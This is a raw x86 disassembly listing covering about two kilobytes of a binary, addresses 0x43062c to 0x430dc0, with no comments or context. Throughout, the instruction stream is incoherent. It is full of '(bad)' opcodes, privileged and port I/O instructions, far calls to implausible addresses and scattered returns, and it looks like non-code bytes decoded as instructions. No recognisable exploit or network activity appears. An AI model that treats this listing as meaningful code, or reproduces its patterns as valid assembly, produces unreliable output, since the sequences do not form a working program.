  43062c:	add    BYTE PTR [ebp+0x7d],al
  43062f:	mov    eax,DWORD PTR [eax]
  430631:	in     al,0x15
  430633:	ret    
  430634:	iret   
  430635:	(bad)  
  430636:	enter  0x14af,0x8b
  43063a:	(bad)  
  43063b:	in     al,dx
  43063c:	or     bl,cl
  43063e:	adc    cl,al
  430640:	push   ebp
  430641:	dec    ebp
  430642:	inc    eax
  430643:	mov    edx,DWORD PTR [ebp-0x20]
  430646:	jb     0x430613
  430648:	mov    ecx,esi
  43064a:	cld    
  43064b:	scas   eax,DWORD PTR es:[edi]
  43064c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430653:	mov    BYTE PTR [eax],0x8c
  430656:	push   0xffffff9a
  430658:	push   edi
  430659:	xor    dl,BYTE PTR [eax+0x3b]
  43065c:	mov    ecx,DWORD PTR [edi]
  43065e:	call   0x8c424bc1
  430663:	mov    eax,eax
  430665:	in     al,dx
  430666:	jge    0x4306b5
  430668:	mov    DWORD PTR [ebx],esi
  43066a:	int3   
  43066b:	add    eax,DWORD PTR [ebp+0xf]
  43066e:	xor    eax,ecx
  430670:	(bad)  
  430671:	dec    ebp
  430672:	pushf  
  430673:	xor    ecx,esp
  430675:	add    edi,DWORD PTR [edi]
  430677:	mov    eax,DWORD PTR [ebp-0x38]
  43067a:	aam    0x84
  43067c:	aam    0x9a
  43067e:	add    esi,DWORD PTR [edx]
  430680:	jmp    0x43060b
  430682:	mov    cl,al
  430684:	add    eax,0x14330f45
  430689:	mov    ecx,0xff458d80
  43068e:	jmp    0xc990165b
  430693:	mov    edx,ecx
  430695:	rol    BYTE PTR [ebp+0x330155],1
  43069b:	add    ecx,DWORD PTR [ebp+0xf]
  43069e:	xor    eax,edx
  4306a0:	(bad)  
  4306a1:	ror    DWORD PTR [eax],0x86
  4306a4:	jb     0x4306a3
  4306a6:	add    bh,bh
  4306a8:	clc    
  4306a9:	inc    ebp
  4306aa:	jb     0x430716
  4306ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4306b2:	xor    eax,0xc7d89c8b
  4306b7:	add    al,al
  4306b9:	push   0xf830c3
  4306be:	inc    ebp
  4306bf:	jne    0x4306f6
  4306c1:	push   0xffffff9c
  4306c3:	inc    edi
  4306c5:	adc    al,0xe8
  4306c7:	inc    ebp
  4306c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4306ce:	mov    ecx,DWORD PTR [eax]
  4306d0:	cld    
  4306d1:	or     DWORD PTR [ebp-0x34],0x33
  4306d5:	jbe    0x4306da
  4306d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4306da:	dec    ebp
  4306db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4306e1:	mov    BYTE PTR [ebx],dh
  4306e3:	mov    eax,DWORD PTR [ebx]
  4306e5:	or     BYTE PTR [ecx+0x3b],dl
  4306e8:	dec    ebp
  4306e9:	int3   
  4306ea:	xor    ebp,edi
  4306ec:	add    eax,DWORD PTR [ebp+0x51]
  4306ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4306f2:	xor    eax,DWORD PTR [eax]
  4306f4:	add    ebp,DWORD PTR [eax+0x51]
  4306f7:	adc    BYTE PTR [eax+0x0],0x8b
  4306fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430701:	inc    ebp
  430702:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430708:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43070e:	dec    ebp
  43070f:	mov    esi,DWORD PTR [ebx]
  430711:	hlt    
  430712:	add    eax,ebx
  430714:	push   ecx
  430715:	inc    ebp
  430716:	dec    ebp
  430717:	aam    0xff
  430719:	aam    0xe4
  43071b:	(bad)  
  43071c:	retf   
  43071d:	mov    al,ds:0xc1ff39ce
  430722:	adc    al,0xc6
  430724:	inc    ebp
  430725:	and    eax,0x9c0f4c85
  43072a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430731:	cmp    BYTE PTR [ebx+0x39],0x0
  430735:	mov    dh,0xc7
  430737:	cmp    eax,eax
  430739:	jne    0x4543ff85
  43073f:	mov    edi,DWORD PTR [ebx]
  430741:	mov    eax,0x848bcb9c
  430746:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43074d:	or     BYTE PTR [edi],cl
  43074f:	(bad)  
  430750:	dec    ebp
  430751:	inc    edi
  430752:	add    bh,0x53
  430755:	or     cl,ch
  430757:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43075d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430763:	mov    esp,0xf802b588
  430768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430769:	inc    ebp
  43076a:	(bad)  
  43076b:	cmp    edi,edi
  43076d:	pushf  
  43076e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430775:	mov    ecx,DWORD PTR [ebp-0x340018]
  43077b:	into   
  43077c:	dec    DWORD PTR [ebx-0x7f72431c]
  430782:	push   0x5000ff01
  430787:	retf   
  430788:	inc    ebp
  430789:	into   
  43078a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430790:	push   eax
  430791:	into   
  430792:	call   0x4b0c22
  430797:	retf   
  430798:	add    dh,cl
  43079a:	add    bh,bh
  43079c:	mov    DWORD PTR [eax+ecx*1],edx
  43079f:	clc    
  4307a0:	inc    ebp
  4307a1:	inc    ebp
  4307a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4307a8:	push   0x1
  4307aa:	push   edi
  4307ab:	add    BYTE PTR [eax-0x35],dl
  4307ae:	mov    ecx,esi
  4307b0:	cld    
  4307b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4307b7:	into   
  4307b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4307bf:	xor    eax,DWORD PTR [ebp+0x3]
  4307c2:	jne    0x430815
  4307c4:	call   DWORD PTR [eax-0x3c]
  4307c7:	mov    DWORD PTR [ecx-0x18],edx
  4307ca:	mov    edi,edi
  4307cc:	call   0x8b464d55
  4307d1:	add    ah,ah
  4307d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4307d7:	add    edi,edi
  4307d9:	add    al,ch
  4307db:	inc    ebp
  4307dc:	push   ecx
  4307dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4307e3:	mov    al,0xc7
  4307e5:	test   esp,esp
  4307e7:	clc    
  4307e8:	test   DWORD PTR [ebp-0x8],ecx
  4307eb:	add    BYTE PTR [ebp+0x53],0x34
  4307ef:	jmp    0x8bcc9090
  4307f4:	in     al,dx
  4307f5:	or     BYTE PTR [ebp-0xf],al
  4307f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4307fe:	hlt    
  4307ff:	mov    eax,DWORD PTR [ebp-0x50]
  430802:	xor    esi,ecx
  430804:	add    eax,DWORD PTR [eax+0x4f086689]
  43080a:	inc    ebp
  43080b:	adc    ebp,0x68
  43080e:	pushf  
  43080f:	inc    edi
  430811:	add    al,ch
  430813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430814:	test   edi,edi
  430816:	clc    
  430817:	inc    DWORD PTR [ebp-0x73]
  43081a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43081e:	(bad)  
  43081f:	push   ecx
  430820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430821:	jne    0x4307a8
  430823:	push   eax
  430824:	clc    
  430825:	test   DWORD PTR [ebp-0x1],eax
  430828:	cmp    bh,bh
  43082a:	pushf  
  43082b:	mov    eax,edi
  43082d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430834:	inc    ebp
  430835:	push   edi
  430836:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43083e:	dec    ebp
  43083f:	add    BYTE PTR [ebx],dh
  430841:	inc    ebp
  430842:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430848:	enter  0x8401,0x0
  43084c:	add    al,BYTE PTR [eax]
  43084e:	add    bh,bh
  430850:	out    dx,eax
  430851:	sbb    BYTE PTR [eax],al
  430853:	dec    ebp
  430854:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43085a:	sub    esi,DWORD PTR [ebx]
  43085c:	mov    ebp,DWORD PTR [eax-0x8]
  43085f:	add    bl,0x0
  430862:	(bad)  
  430863:	cmp    eax,ecx
  430865:	or     BYTE PTR [edx+0x750114],al
  43086b:	inc    DWORD PTR [ebp+0x18]
  43086e:	mov    eax,DWORD PTR [ebp-0x8]
  430871:	mov    ebx,eax
  430873:	(bad)  
  430874:	retf   
  430875:	inc    ebp
  430876:	into   
  430877:	mov    esi,eax
  430879:	int3   
  43087a:	scas   eax,DWORD PTR es:[edi]
  43087b:	push   es
  43087c:	mov    esi,DWORD PTR [ebp-0xc]
  43087f:	call   DWORD PTR [ebp+0x18]
  430882:	sub    edi,DWORD PTR [ebp+0x3b]
  430885:	mov    esi,DWORD PTR [edi-0x34]
  430888:	mov    eax,DWORD PTR [ebp-0x8]
  43088b:	xor    eax,0xc7c69cc3
  430890:	mov    esp,0x8b8500dc
  430895:	clc    
  430896:	mov    esp,0x338b4d45
  43089b:	in     al,0x33
  43089d:	ret    
  43089e:	add    eax,esi
  4308a0:	add    eax,DWORD PTR [ebp+0xf]
  4308a3:	mov    eax,ecx
  4308a5:	in     al,0x4d
  4308a7:	ret    
  4308a8:	mov    eax,esi
  4308aa:	in     al,dx
  4308ab:	inc    ebp
  4308ac:	rol    edi,1
  4308ae:	sar    al,1
  4308b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4308b6:	add    BYTE PTR [ebx],bh
  4308b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4308bf:	test   ebx,eax
  4308c1:	clc    
  4308c2:	retf   
  4308c3:	inc    ebp
  4308c4:	into   
  4308c5:	cmp    esi,eax
  4308c7:	pushf  
  4308c8:	scas   eax,DWORD PTR es:[edi]
  4308c9:	(bad)  
  4308ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4308d1:	inc    ebp
  4308d2:	cmp    edi,DWORD PTR [edi]
  4308d4:	ja     0x430872
  4308d6:	mov    eax,edi
  4308d8:	mov    esp,0x458567a8
  4308dd:	clc    
  4308de:	mov    eax,DWORD PTR [ebp-0x8]
  4308e1:	mov    eax,ebx
  4308e3:	in     al,dx
  4308e4:	retf   
  4308e5:	ret    
  4308e6:	into   
  4308e7:	mov    dh,0x7d
  4308ea:	scas   eax,DWORD PTR es:[edi]
  4308eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4308f1:	add    BYTE PTR [ebx],ch
  4308f3:	jmp    0xba0a33
  4308f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4308fb:	mov    eax,DWORD PTR [ebp-0x14]
  4308fe:	inc    ebp
  4308ff:	enter  0x458b,0xf8
  430903:	xor    eax,ebx
  430905:	add    ecx,ebx
  430907:	cmp    ecx,esi
  430909:	shufps xmm7,xmm4,0xaf
  43090d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430913:	dec    ebp
  430914:	sub    esi,DWORD PTR [ebx]
  430916:	cmp    esi,DWORD PTR [ebx]
  430918:	ja     0x43091d
  43091a:	mov    eax,DWORD PTR [ebx]
  43091c:	lods   al,BYTE PTR ds:[esi]
  43091d:	mov    db0,ecx
  430920:	inc    ebp
  430921:	dec    ebp
  430922:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430928:	retf   
  430929:	rol    dh,1
  43092b:	or     al,0xce
  43092d:	inc    ebp
  43092e:	scas   eax,DWORD PTR es:[edi]
  43092f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430935:	add    BYTE PTR [ebx],ch
  430937:	add    BYTE PTR [ebx],bh
  430939:	inc    ebp
  43093a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430940:	inc    ebp
  430941:	retf   
  430942:	mov    ecx,esi
  430944:	clc    
  430945:	(bad)  
  430946:	retf   
  430947:	scas   eax,DWORD PTR es:[edi]
  430948:	ret    
  430949:	mov    ecx,esi
  43094b:	hlt    
  43094c:	(bad)  
  43094d:	push   ebp
  43094e:	scas   eax,DWORD PTR es:[edi]
  43094f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430955:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  43095b:	add    BYTE PTR [ebx],al
  43095d:	mov    eax,eax
  43095f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430960:	inc    ebp
  430961:	dec    ebp
  430962:	xor    eax,0x89339c33
  430967:	add    edx,eax
  430969:	add    eax,DWORD PTR [ebp+0xf]
  43096c:	xor    al,0xc1
  43096e:	pushf  
  43096f:	dec    ebp
  430970:	(bad)  
  430971:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430977:	rol    BYTE PTR [ebp+0x5],1
  43097a:	xor    eax,DWORD PTR [ebp+0x3]
  43097d:	jmp    0x43096a
  43097f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430985:	xor    eax,DWORD PTR [ebp+0x33]
  430988:	mov    eax,DWORD PTR [ebx]
  43098a:	rol    BYTE PTR [ebx],1
  43098c:	test   BYTE PTR [edi],cl
  43098e:	call   0xb8b:0x884d32c1
  430995:	in     al,dx
  430996:	inc    ebp
  430997:	shl    DWORD PTR [ebx],1
  430999:	rol    BYTE PTR [ebx],1
  43099b:	add    eax,0xeb4d45e0
  4309a0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  4309a6:	add    BYTE PTR [ebx],dh
  4309a8:	inc    ebp
  4309a9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  4309af:	rdpmc  
  4309b1:	rol    DWORD PTR [ebx],0x4d
  4309b4:	loopne 0x430941
  4309b6:	push   ebp
  4309b7:	in     al,dx
  4309b8:	mov    cl,dl
  4309ba:	adc    eax,edx
  4309bc:	jb     0x4309c3
  4309be:	add    BYTE PTR [ebp+0x45],al
  4309c1:	jmp    0x43094e
  4309c3:	mov    ebx,eax
  4309c5:	test   al,0xcb
  4309c7:	dec    ebp
  4309c8:	dec    ebp
  4309c9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  4309cf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  4309d5:	dec    ebp
  4309d6:	mov    al,0x8b
  4309d8:	dec    ebp
  4309d9:	in     al,dx
  4309da:	xor    edx,ecx
  4309dc:	xor    edx,eax
  4309de:	add    eax,DWORD PTR [ebp+0x3]
  4309e1:	jbe    0x4309f2
  4309e3:	mov    eax,ecx
  4309e5:	test   al,0x45
  4309e7:	dec    ebp
  4309e8:	mov    DWORD PTR [ebx],esi
  4309ea:	loopne 0x430a1f
  4309ec:	inc    ebp
  4309ed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  4309f3:	rol    esi,0x45
  4309f6:	scas   eax,DWORD PTR es:[edi]
  4309f7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  4309fd:	mov    eax,ecx
  4309ff:	hlt    
  430a00:	dec    ebp
  430a01:	inc    ebp
  430a02:	mov    eax,edi
  430a04:	loopne 0x4309de
  430a06:	retf   
  430a07:	test   esi,ecx
  430a09:	clc    
  430a0a:	scas   eax,DWORD PTR es:[edi]
  430a0b:	inc    ebp
  430a0c:	mov    eax,edi
  430a0e:	fdiv   st,st(0)
  430a10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430a16:	call   0xf8b:0x3b9c323b
  430a1d:	fcomp  DWORD PTR [esi-0x3d]
  430a20:	inc    esi
  430a22:	mov    ebp,DWORD PTR [eax-0x10]
  430a25:	inc    ebp
  430a26:	dec    ebp
  430a27:	xor    esi,DWORD PTR [ebx]
  430a29:	add    eax,DWORD PTR [ebx]
  430a2b:	loopne 0x430a3c
  430a2d:	dec    ebp
  430a2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430a35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430a3b:	lock call 0xf48b:0x894532c3
  430a43:	rol    BYTE PTR [ebp-0x7c],1
  430a46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430a4c:	call   edi
  430a4e:	enter  0x4d45,0x8b
  430a52:	mov    esi,eax
  430a54:	fmul   st(3),st
  430a56:	push   ebp
  430a57:	dec    ebp
  430a58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430a5e:	ret    0xc19a
  430a61:	xor    al,BYTE PTR [esi-0x280276]
  430a67:	dec    ebp
  430a68:	jne    0x430a9d
  430a6a:	mov    eax,DWORD PTR [ebx]
  430a6c:	cld    
  430a6d:	loopne 0x430a1f
  430a6f:	push   ebp
  430a70:	add    DWORD PTR [eax+0x72851100],ecx
  430a76:	inc    DWORD PTR [eax]
  430a78:	inc    DWORD PTR [ebp-0x75]
  430a7b:	mov    edi,esp
  430a7d:	lock add bl,0x1
  430a81:	retf   
  430a82:	add    dh,al
  430a84:	xor    dh,cl
  430a86:	inc    ebp
  430a87:	scas   eax,DWORD PTR es:[edi]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	shl    al,0x0
  430a8d:	inc    ebp
  430a8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430a94:	call   0x461ccc
  430a99:	ud0    eax,ecx
  430a9c:	adc    al,0x4d
  430a9e:	inc    ebp
  430a9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430aa5:	lock push 0x338055
  430aab:	add    eax,DWORD PTR [eax]
  430aad:	ud0    ecx,edx
  430ab0:	sbb    BYTE PTR [ebp+0x5e],dl
  430ab3:	xor    ecx,ecx
  430ab5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430abc:	push   ecx
  430abd:	add    BYTE PTR [ebp-0x38],cl
  430ac0:	mov    DWORD PTR [esi-0x740004],eax
  430ac6:	cld    
  430ac7:	inc    ebp
  430ac8:	xchg   ebx,eax
  430ac9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430acf:	xabort 0xaf
  430ad2:	icebp  
  430ad3:	mov    esi,DWORD PTR [ebp-0x28]
  430ad6:	(bad)  
  430ad7:	retf   
  430ad8:	or     ecx,eax
  430ada:	(bad)  
  430adb:	dec    ebp
  430adc:	pop    es
  430add:	(bad)  
  430ade:	(bad)  
  430adf:	or     BYTE PTR [esi],al
  430ae1:	jb     0x430aa9
  430ae3:	add    BYTE PTR [ebx],al
  430ae5:	inc    ebp
  430ae6:	(bad)  
  430ae7:	mov    ecx,DWORD PTR [edx]
  430ae9:	fadd   st(6),st
  430aeb:	ret    
  430aec:	add    ah,BYTE PTR [esi-0x37]
  430aef:	int    0x55
  430af1:	sub    ebp,esp
  430af3:	add    edx,DWORD PTR [ecx-0x14]
  430af6:	inc    ebp
  430af7:	inc    ebp
  430af8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430afe:	cld    
  430aff:	(bad)  
  430b00:	(bad)  
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	loopne 0x430b3f
  430b04:	mov    DWORD PTR [edi],ecx
  430b06:	mov    ebp,ebp
  430b08:	clc    
  430b09:	push   eax
  430b0b:	push   DWORD PTR [ebp-0x4]
  430b0e:	mov    BYTE PTR [ebp+0xa],0xff
  430b12:	(bad)  
  430b13:	int3   
  430b14:	or     BYTE PTR [eax],al
  430b16:	(bad)  
  430b17:	lea    eax,[edi]
  430b19:	ins    BYTE PTR es:[edi],dx
  430b1a:	(bad)  
  430b1b:	inc    DWORD PTR [ecx]
  430b1d:	push   eax
  430b1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430b22:	leave  
  430b23:	les    edx,FWORD PTR [ebp+0x0]
  430b26:	in     al,dx
  430b27:	call   DWORD PTR [ecx-0x75]
  430b2a:	inc    ebp
  430b2b:	cld    
  430b2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430b32:	cld    
  430b33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430b39:	sti    
  430b3a:	mov    eax,DWORD PTR [eax]
  430b3c:	clc    
  430b3d:	test   eax,esi
  430b3f:	je     0x430bb6
  430b41:	mov    eax,esi
  430b43:	cld    
  430b44:	add    al,0x80
  430b46:	add    WORD PTR [ecx+0x0],ax
  430b4a:	fadd   DWORD PTR [eax]
  430b4c:	mov    BYTE PTR [eax],0xd4
  430b4f:	push   0xffffffc3
  430b51:	push   edi
  430b52:	mov    edx,DWORD PTR [eax+0x51]
  430b55:	pop    edi
  430b56:	lea    ebx,[ebx-0x8]
  430b59:	ret    0x45
  430b5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430b62:	xchg   eax,edi
  430b64:	mov    DWORD PTR [ebp-0x75],ecx
  430b67:	push   esi
  430b68:	clc    
  430b69:	jne    0x430b3b
  430b6b:	mov    ecx,0xf8450b0b
  430b70:	(bad)  
  430b71:	push   cs
  430b72:	or     BYTE PTR [ebp-0x3a],dh
  430b75:	cmp    eax,DWORD PTR [ecx]
  430b77:	pop    esi
  430b78:	(bad)  
  430b79:	or     al,0x5
  430b7b:	inc    eax
  430b7c:	leave  
  430b7d:	call   0x21994d86
  430b82:	iret   
  430b83:	inc    eax
  430b84:	leave  
  430b85:	jmp    0xd8ce4c89
  430b8a:	mov    eax,DWORD PTR [edx-0x3a]
  430b8d:	jl     0x430b83
  430b8f:	inc    eax
  430b90:	nop
  430b91:	loop   0x430b92
  430b93:	ret    
  430b94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430b9a:	add    eax,0xff45e8f8
  430b9f:	push   esi
  430ba0:	push   DWORD PTR [ebp-0x39]
  430ba3:	mov    eax,0x7e9da46
  430ba8:	or     al,0x6
  430baa:	push   DWORD PTR [ebp-0x3a]
  430bad:	cmp    eax,DWORD PTR [edx]
  430baf:	pop    esi
  430bb0:	ret    
  430bb1:	or     al,0x56
  430bb3:	inc    ecx
  430bb4:	push   ebp
  430bb5:	jl     0x430ba3
  430bb7:	inc    edx
  430bb8:	inc    ebp
  430bb9:	leave  
  430bba:	add    DWORD PTR [ecx+0x28],eax
  430bbd:	and    esp,edi
  430bbf:	inc    ecx
  430bc0:	jne    0x430ba9
  430bc2:	add    DWORD PTR [edx+0x1c],eax
  430bc5:	enter  0xc38b,0x14
  430bc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430bcf:	clc    
  430bd0:	enter  0xd345,0x56
  430bd4:	div    DWORD PTR [ebp+0x50]
  430bd7:	mov    eax,0x7c80ece
  430bdc:	rol    DWORD PTR [esi],cl
  430bde:	div    DWORD PTR [ebp+0x50]
  430be1:	cmp    ecx,edx
  430be3:	pop    esi
  430be4:	dec    BYTE PTR [edx]
  430be6:	in     al,dx
  430be7:	inc    edx
  430be8:	sub    ebp,ebp
  430bea:	inc    eax
  430beb:	(bad)  
  430bec:	push   eax
  430bed:	add    edx,DWORD PTR [eax-0x13]
  430bf0:	push   edi
  430bf1:	add    dh,dh
  430bf3:	leave  
  430bf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430bf8:	add    BYTE PTR [ecx+0x0],dl
  430bfb:	inc    ebp
  430bfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430c02:	add    BYTE PTR [eax-0x7fbf448],bh
  430c08:	add    al,0x2
  430c0a:	jmp    0x57eb764
  430c0f:	jne    0x430bf9
  430c11:	mov    eax,DWORD PTR [edx]
  430c13:	or     BYTE PTR [eax],al
  430c15:	inc    ecx
  430c16:	stc    
  430c17:	jmp    0xe7824c52
  430c1c:	jge    0x430c5f
  430c1e:	mov    esi,ebp
  430c20:	lock ret 0x7d
  430c24:	and    ecx,DWORD PTR [ebx-0x171777]
  430c2a:	add    bh,bh
  430c2c:	aad    0xd7
  430c2e:	add    dh,cl
  430c30:	clts   
  430c32:	(bad)  
  430c33:	call   0xffce0b38
  430c38:	hlt    
  430c39:	iret   
  430c3a:	jge    0x430c12
  430c3c:	rol    DWORD PTR [esi-0x80],cl
  430c3f:	cmc    
  430c40:	or     BYTE PTR [edi-0x27],cl
  430c43:	(bad)  
  430c44:	out    dx,al
  430c45:	mov    eax,DWORD PTR [ebx]
  430c47:	(bad)  
  430c48:	pop    esi
  430c49:	push   es
  430c4a:	cmp    al,0xe8
  430c4c:	sar    edi,0x8
  430c4f:	inc    DWORD PTR [edi]
  430c51:	inc    esi
  430c52:	(bad)  
  430c53:	loop   0x430cd3
  430c55:	push   edi
  430c56:	push   cs
  430c57:	push   ebx
  430c58:	add    BYTE PTR [ebx+0x24008b56],cl
  430c5e:	add    BYTE PTR [ebp+0x50],al
  430c61:	push   eax
  430c62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430c68:	sub    edx,DWORD PTR [esi-0x24]
  430c6b:	jne    0x430c23
  430c6d:	lods   eax,DWORD PTR ds:[esi]
  430c6e:	mov    edx,DWORD PTR [edx-0x34]
  430c71:	dec    esi
  430c72:	out    0x83,eax
  430c74:	into   
  430c75:	push   edi
  430c77:	loopne 0x430c47
  430c79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430c7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430c84:	rol    DWORD PTR [edx],0x8
  430c87:	mov    esp,ecx
  430c89:	cmp    DWORD PTR [ebx],0xc
  430c8c:	mov    esi,0x5001c0
  430c91:	push   eax
  430c92:	push   cs
  430c93:	push   eax
  430c94:	(bad)  
  430c95:	sub    edx,edi
  430c97:	push   esi
  430c98:	adc    al,0xcb
  430c9a:	ins    DWORD PTR es:[edi],dx
  430c9b:	mov    eax,0x203e8
  430ca0:	add    al,ah
  430ca2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ca9:	add    dh,al
  430cab:	add    ah,ch
  430cad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430cb3:	pop    ecx
  430cb4:	or     eax,ebx
  430cb6:	cli    
  430cb7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430cbd:	lea    ebp,[ebx]
  430cbf:	mov    edx,DWORD PTR [edx-0x4]
  430cc2:	dec    ecx
  430cc3:	inc    ebp
  430cc4:	shr    BYTE PTR [ebx],0x4b
  430cc7:	and    al,0x0
  430cc9:	(bad)  
  430cca:	jne    0x430d11
  430ccc:	pop    eax
  430ccd:	mov    al,0x5a
  430ccf:	call   0x1420f2e
  430cd4:	and    al,0x85
  430cd6:	push   edx
  430cd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430cdb:	dec    ebp
  430cdc:	mov    cl,0x23
  430cde:	jmp    0x430ccc
  430ce0:	mov    al,0xe7
  430ce2:	call   0x1390fd0
  430ce7:	shr    DWORD PTR [eax+ebx*2],cl
  430cea:	lock (bad) 
  430cec:	adc    eax,0x757f008d
  430cf1:	out    0x58,eax
  430cf3:	cmp    al,0x7
  430cf5:	pop    edx
  430cf6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430cfd:	push   ecx
  430cfe:	cld    
  430cff:	mov    esi,0x3b0175
  430d04:	and    al,0xb0
  430d06:	xor    BYTE PTR [edx+0x1],0x8b
  430d0a:	add    ah,bh
  430d0c:	mov    edi,DWORD PTR [ebp-0x4]
  430d0f:	psubsw mm7,QWORD PTR [edi]
  430d12:	add    DWORD PTR [ebp+0x0],ebp
  430d15:	rcr    eax,1
  430d17:	mov    edi,ecx
  430d19:	and    eax,DWORD PTR [eax]
  430d1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430d21:	call   0x130100a
  430d26:	add    al,cl
  430d28:	mov    ebp,esi
  430d2a:	aam    0x83
  430d2c:	or     DWORD PTR [ecx],eax
  430d2e:	jne    0x430d21
  430d30:	mov    eax,DWORD PTR [eax]
  430d32:	aam    0x0
  430d34:	dec    ebp
  430d35:	jne    0x430cc2
  430d37:	cmp    ebx,eax
  430d39:	jb     0x430d88
  430d3b:	jmp    0x430cc8
  430d3d:	mov    ebx,esp
  430d3f:	int3   
  430d40:	dec    ebp
  430d41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430d48:	mov    edx,0x8b0a8b
  430d4d:	cmp    ecx,DWORD PTR [eax]
  430d4f:	jb     0x430d28
  430d51:	pop    edx
  430d52:	push   edi
  430d53:	cli    
  430d54:	pop    es
  430d55:	mov    eax,ecx
  430d57:	jb     0x430d5b
  430d59:	add    DWORD PTR [ebx],0xa
  430d5c:	mov    eax,DWORD PTR [ebx]
  430d5e:	int3   
  430d5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430d65:	jmp    0x430cf2
  430d67:	mov    al,0xe8
  430d69:	call   0x1040feb
  430d6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430d71:	pop    edi
  430d72:	or     BYTE PTR [ecx-0x73],bl
  430d75:	pop    ecx
  430d76:	inc    edi
  430d77:	xor    al,0xeb
  430d79:	push   ecx
  430d7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430d80:	call   0xb20e85
  430d85:	int3   
  430d86:	sbb    BYTE PTR [esi],ch
  430d88:	inc    ebp
  430d89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430d8f:	call   0x9c0ffe
  430d94:	or     BYTE PTR [ebx-0x73],dl
  430d97:	cmp    al,0x47
  430d99:	mov    al,0x1
  430d9b:	jb     0x430d9d
  430d9d:	mov    al,0x10
  430d9f:	push   eax
  430da0:	add    al,0x75
  430da2:	add    BYTE PTR [ebx],ch
  430da4:	add    ebx,esp
  430da6:	int3   
  430da7:	jne    0x430db9
  430da9:	movsx  edx,cl
  430dac:	add    DWORD PTR [eax],eax
  430dae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430db5:	mov    gs,edi
  430db7:	add    BYTE PTR [eax-0x50],ch
  430dba:	add    al,ch
  430dbc:	mov    eax,DWORD PTR [ecx]
  430dbe:	sub    eax,DWORD PTR [eax]
  430dc0:	jb     0x430e37
